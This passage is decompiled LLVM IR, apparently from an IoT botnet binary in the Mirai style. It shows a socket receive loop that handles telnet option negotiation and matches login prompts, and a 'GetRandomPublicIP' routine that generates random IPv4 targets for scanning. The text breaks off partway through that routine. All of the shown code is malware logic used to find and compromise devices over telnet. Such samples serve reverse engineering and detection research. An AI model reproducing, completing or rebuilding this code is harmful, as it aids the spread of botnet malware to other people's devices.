dec_label_pc_a838:                                ; preds = %dec_label_pc_a838.lr.ph, %dec_label_pc_a838
  %storemerge27 = phi i32 [ 0, %dec_label_pc_a838.lr.ph ], [ %v1_a84c, %dec_label_pc_a838 ]
  %v5_a844 = mul nuw nsw i32 %storemerge27, 4
  %v6_a844 = add i32 %v5_a844, %v2_a824
  %v7_a844 = inttoptr i32 %v6_a844 to i32*
  store i32 0, i32* %v7_a844, align 4
  %v1_a84c = add nuw nsw i32 %storemerge27, 1
  %tmp30 = icmp ult i32 %v1_a84c, 32
  br i1 %tmp30, label %dec_label_pc_a838, label %dec_label_pc_a860

dec_label_pc_a860:                                ; preds = %dec_label_pc_a838
  %v2_a880 = load i32, i32* %v1_a880, align 4
  %v2_a894 = or i32 %v2_a880, %v6_a890
  store i32 %v2_a894, i32* %v1_a880, align 4
  %v5_a8d0 = call i32 @__libc_select(i32 %v1_a8b4, i32 %v2_a824, i32 0, i32 0, i32 %v2_a8bc)
  %tmp31 = icmp slt i32 %v5_a8d0, 1
  br i1 %tmp31, label %dec_label_pc_aa5c, label %dec_label_pc_a8e0

dec_label_pc_a8e0:                                ; preds = %dec_label_pc_a860
  %v2_a8ec = add i32 %stack_var_-40.0, %arg6
  %v5_a8f0 = inttoptr i32 %v2_a8ec to i8*
  %v6_a904 = inttoptr i32 %v2_a8ec to i32*
  %v7_a904 = call i32 @__libc_recv(i32 %arg1, i32* %v6_a904, i32 1, i32 0, i32 %v2_a8ec)
  %v7_a914 = icmp eq i32 %v7_a904, -1
  br i1 %v7_a914, label %dec_label_pc_a928, label %dec_label_pc_a91c

dec_label_pc_a91c:                                ; preds = %dec_label_pc_a8e0
  %v2_a920 = icmp eq i32 %v7_a904, 0
  br i1 %v2_a920, label %dec_label_pc_a928, label %dec_label_pc_a934

dec_label_pc_a928:                                ; preds = %dec_label_pc_a91c, %dec_label_pc_a8e0
  br label %dec_label_pc_aa64

dec_label_pc_a934:                                ; preds = %dec_label_pc_a91c
  %v2_a93c = add i32 %v7_a904, %stack_var_-40.0
  %v2_a948 = load i8, i8* %v5_a8f0, align 1
  %v2_a94c = icmp eq i8 %v2_a948, -1
  br i1 %v2_a94c, label %dec_label_pc_a954, label %dec_label_pc_a9d4

dec_label_pc_a954:                                ; preds = %dec_label_pc_a934
  %v1_a958 = add i32 %v2_a8ec, 1
  %v5_a96c = inttoptr i32 %v1_a958 to i32*
  %v6_a96c = call i32 @__libc_recv(i32 %arg1, i32* %v5_a96c, i32 2, i32 0, i32 %v2_a93c)
  %v7_a97c = icmp eq i32 %v6_a96c, -1
  br i1 %v7_a97c, label %dec_label_pc_a990, label %dec_label_pc_a984

dec_label_pc_a984:                                ; preds = %dec_label_pc_a954
  %v2_a988 = icmp eq i32 %v6_a96c, 0
  br i1 %v2_a988, label %dec_label_pc_a990, label %dec_label_pc_a99c

dec_label_pc_a990:                                ; preds = %dec_label_pc_a984, %dec_label_pc_a954
  br label %dec_label_pc_aa64

dec_label_pc_a99c:                                ; preds = %dec_label_pc_a984
  %v2_a9a4 = add i32 %v6_a96c, %v2_a93c
  %v5_a9b8 = call i32 @negotiate(i32 %arg1, i32 %v2_a8ec, i32 3, i32 %v2_a9a4, i32 %v2_a9a4)
  %v2_a9c0 = icmp eq i32 %v5_a9b8, 0
  br i1 %v2_a9c0, label %dec_label_pc_a9c8, label %dec_label_pc_aa18

dec_label_pc_a9c8:                                ; preds = %dec_label_pc_a99c
  br label %dec_label_pc_aa64

dec_label_pc_a9d4:                                ; preds = %dec_label_pc_a934
  %v7_a9dc = call i32 @strstr(i32 %arg6, i8* %v6_a9dc)
  %v2_a9e4 = icmp eq i32 %v7_a9dc, 0
  br i1 %v2_a9e4, label %dec_label_pc_a9ec, label %dec_label_pc_aa50

dec_label_pc_a9ec:                                ; preds = %dec_label_pc_a9d4
  br i1 %v2_a9f0, label %dec_label_pc_aa18, label %dec_label_pc_a9f8

dec_label_pc_a9f8:                                ; preds = %dec_label_pc_a9ec
  %v2_a9fc = call i32 @matchPrompt(i8* %v1_a9fc)
  %v2_aa04 = icmp eq i32 %v2_a9fc, 0
  br i1 %v2_aa04, label %dec_label_pc_aa18, label %dec_label_pc_aa50

dec_label_pc_aa18:                                ; preds = %dec_label_pc_a99c, %dec_label_pc_a9f8, %dec_label_pc_a9ec, %entry
  %stack_var_-40.0 = phi i32 [ %arg8, %entry ], [ %v2_a9a4, %dec_label_pc_a99c ], [ %v2_a93c, %dec_label_pc_a9ec ], [ %v2_a93c, %dec_label_pc_a9f8 ]
  %v1_aa1c = add i32 %stack_var_-40.0, 2
  %v6_aa28 = icmp slt i32 %v1_aa1c, %arg7
  br i1 %v6_aa28, label %dec_label_pc_aa2c, label %dec_label_pc_aa5c

dec_label_pc_aa2c:                                ; preds = %dec_label_pc_aa18
  %v3_aa2c = load i32, i32* %stack_var_-176, align 4
  %v5_aa34 = icmp sgt i32 %v3_aa2c, 0
  br i1 %v5_aa34, label %dec_label_pc_a838.lr.ph, label %dec_label_pc_aa38

dec_label_pc_aa38:                                ; preds = %dec_label_pc_aa2c
  br i1 %v5_aa40, label %dec_label_pc_a838.lr.ph, label %dec_label_pc_aa5c

dec_label_pc_aa50:                                ; preds = %dec_label_pc_a9d4, %dec_label_pc_a9f8
  br label %dec_label_pc_aa64

dec_label_pc_aa5c:                                ; preds = %dec_label_pc_a860, %dec_label_pc_aa38, %dec_label_pc_aa18
  br label %dec_label_pc_aa64

dec_label_pc_aa64:                                ; preds = %dec_label_pc_aa50, %dec_label_pc_a9c8, %dec_label_pc_a990, %dec_label_pc_a928, %dec_label_pc_aa5c
  %stack_var_-196.0 = phi i32 [ 0, %dec_label_pc_aa5c ], [ 1, %dec_label_pc_aa50 ], [ 0, %dec_label_pc_a928 ], [ 0, %dec_label_pc_a990 ], [ 0, %dec_label_pc_a9c8 ]
  ret i32 %stack_var_-196.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 2, 1, 0 }
  uselistorder i32 %v6_a96c, { 1, 2, 0 }
  uselistorder i32 %v7_a904, { 1, 2, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v2_a824, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_aa64, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_aa5c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_aa50, { 1, 0 }
  uselistorder label %dec_label_pc_aa18, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_a838, { 1, 0 }
  uselistorder label %dec_label_pc_a838.lr.ph, { 1, 0 }
}

define i32 @GetRandomPublicIP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_aa78 = load i32, i32* @fp, align 4
  store i32 43648, i32* %stack_var_-4, align 4
  %v2_aa7c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_aa7c, i32* @fp, align 4
  %v2_aa80 = ptrtoint i32* %stack_var_-36 to i32
  store i8 0, i8* @global_var_2d61b.81, align 1
  store i8 0, i8* @global_var_2d61c.82, align 1
  store i8 0, i8* @global_var_2d61d.83, align 1
  store i8 0, i8* @global_var_2d61e.84, align 1
  %v0_aab4 = call i32 @random()
  %v2_aac4 = srem i32 %v0_aab4, 255
  %v1_aad4 = trunc i32 %v2_aac4 to i8
  store i8 %v1_aad4, i8* @global_var_2d61b.81, align 1
  %v0_aad8 = call i32 @random()
  %v2_aae8 = srem i32 %v0_aad8, 255
  %v1_aaf8 = trunc i32 %v2_aae8 to i8
  store i8 %v1_aaf8, i8* @global_var_2d61c.82, align 1
  %v0_aafc = call i32 @random()
  %v2_ab0c = srem i32 %v0_aafc, 255
  %v1_ab1c = trunc i32 %v2_ab0c to i8
  store i8 %v1_ab1c, i8* @global_var_2d61d.83, align 1
  %v0_ab20 = call i32 @random()
  %v2_ab30 = srem i32 %v0_ab20, 255
  %v1_ab40 = trunc i32 %v2_ab30 to i8
  store i8 %v1_ab40, i8* @global_var_2d61e.84, align 1
  %v0_ab44 = call i32 @random()
  %v2_ab54 = srem i32 %v0_ab44, 115
  %v2_ab64 = icmp eq i32 %v2_ab54, 0
  br i1 %v2_ab64, label %dec_label_pc_ab6c, label %dec_label_pc_ab94

dec_label_pc_ab6c:                                ; preds = %entry
  %v3_ab78 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_ab84 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_ab90 = sext i8 %v3_ab78 to i32
  %v6_ab90 = sext i8 %v3_ab84 to i32
  %v8_ab90 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b34c.86 to i32), i32 %v4_ab90, i32 %v6_ab90, i32 0)
  br label %dec_label_pc_ab94

dec_label_pc_ab94:                                ; preds = %entry, %dec_label_pc_ab6c
  %v7_ab98 = icmp eq i32 %v2_ab54, 1
  br i1 %v7_ab98, label %dec_label_pc_aba0, label %dec_label_pc_abc8

dec_label_pc_aba0:                                ; preds = %dec_label_pc_ab94
  %v3_abac = load i8, i8* @global_var_2d61d.83, align 1
  %v3_abb8 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_abc4 = sext i8 %v3_abac to i32
  %v6_abc4 = sext i8 %v3_abb8 to i32
  %v8_abc4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b35c.88 to i32), i32 %v4_abc4, i32 %v6_abc4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_abc8

dec_label_pc_abc8:                                ; preds = %dec_label_pc_ab94, %dec_label_pc_aba0
  %v7_abcc = icmp eq i32 %v2_ab54, 2
  br i1 %v7_abcc, label %dec_label_pc_abd4, label %dec_label_pc_abfc

dec_label_pc_abd4:                                ; preds = %dec_label_pc_abc8
  %v3_abe0 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_abec = load i8, i8* @global_var_2d61e.84, align 1
  %v4_abf8 = sext i8 %v3_abe0 to i32
  %v6_abf8 = sext i8 %v3_abec to i32
  %v8_abf8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([11 x i8]* @global_var_1b36c.90 to i32), i32 %v4_abf8, i32 %v6_abf8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_abfc

dec_label_pc_abfc:                                ; preds = %dec_label_pc_abc8, %dec_label_pc_abd4
  %v7_ac00 = icmp eq i32 %v2_ab54, 3
  br i1 %v7_ac00, label %dec_label_pc_ac08, label %dec_label_pc_ac30

dec_label_pc_ac08:                                ; preds = %dec_label_pc_abfc
  %v3_ac14 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_ac20 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_ac2c = sext i8 %v3_ac14 to i32
  %v6_ac2c = sext i8 %v3_ac20 to i32
  %v8_ac2c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b378.92 to i32), i32 %v4_ac2c, i32 %v6_ac2c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac30

dec_label_pc_ac30:                                ; preds = %dec_label_pc_abfc, %dec_label_pc_ac08
  %v7_ac34 = icmp eq i32 %v2_ab54, 4
  br i1 %v7_ac34, label %dec_label_pc_ac3c, label %dec_label_pc_ac64

dec_label_pc_ac3c:                                ; preds = %dec_label_pc_ac30
  %v3_ac48 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_ac54 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_ac60 = sext i8 %v3_ac48 to i32
  %v6_ac60 = sext i8 %v3_ac54 to i32
  %v8_ac60 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([11 x i8]* @global_var_1b388.94 to i32), i32 %v4_ac60, i32 %v6_ac60, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac64

dec_label_pc_ac64:                                ; preds = %dec_label_pc_ac30, %dec_label_pc_ac3c
  %v7_ac68 = icmp eq i32 %v2_ab54, 5
  br i1 %v7_ac68, label %dec_label_pc_ac70, label %dec_label_pc_ac98

dec_label_pc_ac70:                                ; preds = %dec_label_pc_ac64
  %v3_ac7c = load i8, i8* @global_var_2d61d.83, align 1
  %v3_ac88 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_ac94 = sext i8 %v3_ac7c to i32
  %v6_ac94 = sext i8 %v3_ac88 to i32
  %v8_ac94 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b394.96 to i32), i32 %v4_ac94, i32 %v6_ac94, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac98

dec_label_pc_ac98:                                ; preds = %dec_label_pc_ac64, %dec_label_pc_ac70
  %v7_ac9c = icmp eq i32 %v2_ab54, 6
  br i1 %v7_ac9c, label %dec_label_pc_aca4, label %dec_label_pc_accc

dec_label_pc_aca4:                                ; preds = %dec_label_pc_ac98
  %v3_acb0 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_acbc = load i8, i8* @global_var_2d61e.84, align 1
  %v4_acc8 = sext i8 %v3_acb0 to i32
  %v6_acc8 = sext i8 %v3_acbc to i32
  %v8_acc8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b3a4.98 to i32), i32 %v4_acc8, i32 %v6_acc8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_accc

dec_label_pc_accc:                                ; preds = %dec_label_pc_ac98, %dec_label_pc_aca4
  %v7_acd0 = icmp eq i32 %v2_ab54, 7
  br i1 %v7_acd0, label %dec_label_pc_acd8, label %dec_label_pc_ad00

dec_label_pc_acd8:                                ; preds = %dec_label_pc_accc
  %v3_ace4 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_acf0 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_acfc = sext i8 %v3_ace4 to i32
  %v6_acfc = sext i8 %v3_acf0 to i32
  %v8_acfc = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b3b0.100 to i32), i32 %v4_acfc, i32 %v6_acfc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad00

dec_label_pc_ad00:                                ; preds = %dec_label_pc_accc, %dec_label_pc_acd8
  %v7_ad04 = icmp eq i32 %v2_ab54, 8
  br i1 %v7_ad04, label %dec_label_pc_ad0c, label %dec_label_pc_ad34

dec_label_pc_ad0c:                                ; preds = %dec_label_pc_ad00
  %v3_ad18 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_ad24 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_ad30 = sext i8 %v3_ad18 to i32
  %v6_ad30 = sext i8 %v3_ad24 to i32
  %v8_ad30 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b3c0.102 to i32), i32 %v4_ad30, i32 %v6_ad30, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad34

dec_label_pc_ad34:                                ; preds = %dec_label_pc_ad00, %dec_label_pc_ad0c
  %v7_ad38 = icmp eq i32 %v2_ab54, 9
  br i1 %v7_ad38, label %dec_label_pc_ad40, label %dec_label_pc_ad68

dec_label_pc_ad40:                                ; preds = %dec_label_pc_ad34
  %v3_ad4c = load i8, i8* @global_var_2d61d.83, align 1
  %v3_ad58 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_ad64 = sext i8 %v3_ad4c to i32
  %v6_ad64 = sext i8 %v3_ad58 to i32
  %v8_ad64 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b3d0.104 to i32), i32 %v4_ad64, i32 %v6_ad64, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad68

dec_label_pc_ad68:                                ; preds = %dec_label_pc_ad34, %dec_label_pc_ad40
  %v7_ad6c = icmp eq i32 %v2_ab54, 10
  br i1 %v7_ad6c, label %dec_label_pc_ad74, label %dec_label_pc_ad9c

dec_label_pc_ad74:                                ; preds = %dec_label_pc_ad68
  %v3_ad80 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_ad8c = load i8, i8* @global_var_2d61e.84, align 1
  %v4_ad98 = sext i8 %v3_ad80 to i32
  %v6_ad98 = sext i8 %v3_ad8c to i32
  %v8_ad98 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b3e0.106 to i32), i32 %v4_ad98, i32 %v6_ad98, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad9c

dec_label_pc_ad9c:                                ; preds = %dec_label_pc_ad68, %dec_label_pc_ad74
  %v7_ada0 = icmp eq i32 %v2_ab54, 11
  br i1 %v7_ada0, label %dec_label_pc_ada8, label %dec_label_pc_add0

dec_label_pc_ada8:                                ; preds = %dec_label_pc_ad9c
  %v3_adb4 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_adc0 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_adcc = sext i8 %v3_adb4 to i32
  %v6_adcc = sext i8 %v3_adc0 to i32
  %v8_adcc = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([11 x i8]* @global_var_1b3f0.108 to i32), i32 %v4_adcc, i32 %v6_adcc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_add0

dec_label_pc_add0:                                ; preds = %dec_label_pc_ad9c, %dec_label_pc_ada8
  %v7_add4 = icmp eq i32 %v2_ab54, 12
  br i1 %v7_add4, label %dec_label_pc_addc, label %dec_label_pc_ae04

dec_label_pc_addc:                                ; preds = %dec_label_pc_add0
  %v3_ade8 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_adf4 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_ae00 = sext i8 %v3_ade8 to i32
  %v6_ae00 = sext i8 %v3_adf4 to i32
  %v8_ae00 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b35c.88 to i32), i32 %v4_ae00, i32 %v6_ae00, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae04

dec_label_pc_ae04:                                ; preds = %dec_label_pc_add0, %dec_label_pc_addc
  %v7_ae08 = icmp eq i32 %v2_ab54, 13
  br i1 %v7_ae08, label %dec_label_pc_ae10, label %dec_label_pc_ae38

dec_label_pc_ae10:                                ; preds = %dec_label_pc_ae04
  %v3_ae1c = load i8, i8* @global_var_2d61d.83, align 1
  %v3_ae28 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_ae34 = sext i8 %v3_ae1c to i32
  %v6_ae34 = sext i8 %v3_ae28 to i32
  %v8_ae34 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b3fc.110 to i32), i32 %v4_ae34, i32 %v6_ae34, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae38

dec_label_pc_ae38:                                ; preds = %dec_label_pc_ae04, %dec_label_pc_ae10
  %v7_ae3c = icmp eq i32 %v2_ab54, 14
  br i1 %v7_ae3c, label %dec_label_pc_ae44, label %dec_label_pc_ae6c

dec_label_pc_ae44:                                ; preds = %dec_label_pc_ae38
  %v3_ae50 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_ae5c = load i8, i8* @global_var_2d61e.84, align 1
  %v4_ae68 = sext i8 %v3_ae50 to i32
  %v6_ae68 = sext i8 %v3_ae5c to i32
  %v8_ae68 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b40c.112 to i32), i32 %v4_ae68, i32 %v6_ae68, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae6c

dec_label_pc_ae6c:                                ; preds = %dec_label_pc_ae38, %dec_label_pc_ae44
  %v7_ae70 = icmp eq i32 %v2_ab54, 15
  br i1 %v7_ae70, label %dec_label_pc_ae78, label %dec_label_pc_aea0

dec_label_pc_ae78:                                ; preds = %dec_label_pc_ae6c
  %v3_ae84 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_ae90 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_ae9c = sext i8 %v3_ae84 to i32
  %v6_ae9c = sext i8 %v3_ae90 to i32
  %v8_ae9c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b41c.114 to i32), i32 %v4_ae9c, i32 %v6_ae9c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aea0

dec_label_pc_aea0:                                ; preds = %dec_label_pc_ae6c, %dec_label_pc_ae78
  %v7_aea4 = icmp eq i32 %v2_ab54, 16
  br i1 %v7_aea4, label %dec_label_pc_aeac, label %dec_label_pc_aed4

dec_label_pc_aeac:                                ; preds = %dec_label_pc_aea0
  %v3_aeb8 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_aec4 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_aed0 = sext i8 %v3_aeb8 to i32
  %v6_aed0 = sext i8 %v3_aec4 to i32
  %v8_aed0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b42c.116 to i32), i32 %v4_aed0, i32 %v6_aed0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aed4

dec_label_pc_aed4:                                ; preds = %dec_label_pc_aea0, %dec_label_pc_aeac
  %v7_aed8 = icmp eq i32 %v2_ab54, 17
  br i1 %v7_aed8, label %dec_label_pc_aee0, label %dec_label_pc_af08

dec_label_pc_aee0:                                ; preds = %dec_label_pc_aed4
  %v3_aeec = load i8, i8* @global_var_2d61d.83, align 1
  %v3_aef8 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_af04 = sext i8 %v3_aeec to i32
  %v6_af04 = sext i8 %v3_aef8 to i32
  %v8_af04 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b43c.118 to i32), i32 %v4_af04, i32 %v6_af04, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af08

dec_label_pc_af08:                                ; preds = %dec_label_pc_aed4, %dec_label_pc_aee0
  %v7_af0c = icmp eq i32 %v2_ab54, 18
  br i1 %v7_af0c, label %dec_label_pc_af14, label %dec_label_pc_af3c

dec_label_pc_af14:                                ; preds = %dec_label_pc_af08
  %v3_af20 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_af2c = load i8, i8* @global_var_2d61e.84, align 1
  %v4_af38 = sext i8 %v3_af20 to i32
  %v6_af38 = sext i8 %v3_af2c to i32
  %v8_af38 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b44c.120 to i32), i32 %v4_af38, i32 %v6_af38, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af3c

dec_label_pc_af3c:                                ; preds = %dec_label_pc_af08, %dec_label_pc_af14
  %v7_af40 = icmp eq i32 %v2_ab54, 19
  br i1 %v7_af40, label %dec_label_pc_af48, label %dec_label_pc_af70

dec_label_pc_af48:                                ; preds = %dec_label_pc_af3c
  %v3_af54 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_af60 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_af6c = sext i8 %v3_af54 to i32
  %v6_af6c = sext i8 %v3_af60 to i32
  %v8_af6c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([11 x i8]* @global_var_1b45c.122 to i32), i32 %v4_af6c, i32 %v6_af6c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af70

dec_label_pc_af70:                                ; preds = %dec_label_pc_af3c, %dec_label_pc_af48
  %v7_af74 = icmp eq i32 %v2_ab54, 20
  br i1 %v7_af74, label %dec_label_pc_af7c, label %dec_label_pc_afa4

dec_label_pc_af7c:                                ; preds = %dec_label_pc_af70
  %v3_af88 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_af94 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_afa0 = sext i8 %v3_af88 to i32
  %v6_afa0 = sext i8 %v3_af94 to i32
  %v8_afa0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b468.124 to i32), i32 %v4_afa0, i32 %v6_afa0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_afa4

dec_label_pc_afa4:                                ; preds = %dec_label_pc_af70, %dec_label_pc_af7c
  %v7_afa8 = icmp eq i32 %v2_ab54, 21
  br i1 %v7_afa8, label %dec_label_pc_afb0, label %dec_label_pc_afd8

dec_label_pc_afb0:                                ; preds = %dec_label_pc_afa4
  %v3_afbc = load i8, i8* @global_var_2d61d.83, align 1
  %v3_afc8 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_afd4 = sext i8 %v3_afbc to i32
  %v6_afd4 = sext i8 %v3_afc8 to i32
  %v8_afd4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b474.126 to i32), i32 %v4_afd4, i32 %v6_afd4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_afd8

dec_label_pc_afd8:                                ; preds = %dec_label_pc_afa4, %dec_label_pc_afb0
  %v7_afdc = icmp eq i32 %v2_ab54, 22
  br i1 %v7_afdc, label %dec_label_pc_afe4, label %dec_label_pc_b00c

dec_label_pc_afe4:                                ; preds = %dec_label_pc_afd8
  %v3_aff0 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_affc = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b008 = sext i8 %v3_aff0 to i32
  %v6_b008 = sext i8 %v3_affc to i32
  %v8_b008 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([11 x i8]* @global_var_1b484.128 to i32), i32 %v4_b008, i32 %v6_b008, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b00c

dec_label_pc_b00c:                                ; preds = %dec_label_pc_afd8, %dec_label_pc_afe4
  %v7_b010 = icmp eq i32 %v2_ab54, 23
  br i1 %v7_b010, label %dec_label_pc_b018, label %dec_label_pc_b040

dec_label_pc_b018:                                ; preds = %dec_label_pc_b00c
  %v3_b024 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b030 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b03c = sext i8 %v3_b024 to i32
  %v6_b03c = sext i8 %v3_b030 to i32
  %v8_b03c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([11 x i8]* @global_var_1b490.130 to i32), i32 %v4_b03c, i32 %v6_b03c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b040

dec_label_pc_b040:                                ; preds = %dec_label_pc_b00c, %dec_label_pc_b018
  %v7_b044 = icmp eq i32 %v2_ab54, 24
  br i1 %v7_b044, label %dec_label_pc_b04c, label %dec_label_pc_b074

dec_label_pc_b04c:                                ; preds = %dec_label_pc_b040
  %v3_b058 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b064 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b070 = sext i8 %v3_b058 to i32
  %v6_b070 = sext i8 %v3_b064 to i32
  %v8_b070 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b49c.132 to i32), i32 %v4_b070, i32 %v6_b070, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b074

dec_label_pc_b074:                                ; preds = %dec_label_pc_b040, %dec_label_pc_b04c
  %v7_b078 = icmp eq i32 %v2_ab54, 25
  br i1 %v7_b078, label %dec_label_pc_b080, label %dec_label_pc_b0a8

dec_label_pc_b080:                                ; preds = %dec_label_pc_b074
  %v3_b08c = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b098 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b0a4 = sext i8 %v3_b08c to i32
  %v6_b0a4 = sext i8 %v3_b098 to i32
  %v8_b0a4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b4a8.134 to i32), i32 %v4_b0a4, i32 %v6_b0a4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b0a8

dec_label_pc_b0a8:                                ; preds = %dec_label_pc_b074, %dec_label_pc_b080
  %v7_b0ac = icmp eq i32 %v2_ab54, 26
  br i1 %v7_b0ac, label %dec_label_pc_b0b4, label %dec_label_pc_b0dc

dec_label_pc_b0b4:                                ; preds = %dec_label_pc_b0a8
  %v3_b0c0 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b0cc = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b0d8 = sext i8 %v3_b0c0 to i32
  %v6_b0d8 = sext i8 %v3_b0cc to i32
  %v8_b0d8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b4b4.136 to i32), i32 %v4_b0d8, i32 %v6_b0d8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b0dc

dec_label_pc_b0dc:                                ; preds = %dec_label_pc_b0a8, %dec_label_pc_b0b4
  %v7_b0e0 = icmp eq i32 %v2_ab54, 27
  br i1 %v7_b0e0, label %dec_label_pc_b0e8, label %dec_label_pc_b110

dec_label_pc_b0e8:                                ; preds = %dec_label_pc_b0dc
  %v3_b0f4 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b100 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b10c = sext i8 %v3_b0f4 to i32
  %v6_b10c = sext i8 %v3_b100 to i32
